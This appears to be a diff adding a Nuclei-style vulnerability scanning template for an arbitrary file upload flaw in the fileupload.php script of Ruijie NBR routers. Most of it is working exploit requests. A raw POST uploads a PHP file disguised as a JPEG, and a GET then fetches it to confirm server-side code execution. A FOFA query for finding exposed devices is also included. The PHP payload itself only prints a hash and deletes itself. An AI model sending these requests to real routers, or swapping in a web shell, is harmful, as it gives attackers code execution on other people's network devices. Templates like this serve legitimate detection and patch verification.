@@ -1,0 +1,40 @@
+id: ruijie-nbr-fileupload
+
+info:
+  name: Ruijie NBR fileupload.php - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/ruijie-nbr-fileupload.yaml
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="Ruijie-NBR路由器"
+  tags: ruijie,fileupload,intrusive,nbr
+
+variables:
+  filename: "{{rand_base(6)}}"
+  string: "ruijie-nbr-fileupload"
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=upload&name={{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/plain, */*; q=0.01
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+      - |
+        GET /ddi/server/upload/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a0047304502200f1af547bd8053e4edfefa17d041dd036a48a0a8d314de83194c3b598a1541c3022100c777cdb5f97c0a292e81951e428adc63b7897a18f5d78371bccc1476355cfe1e:922c64590222798bb761d5b6d8e72950
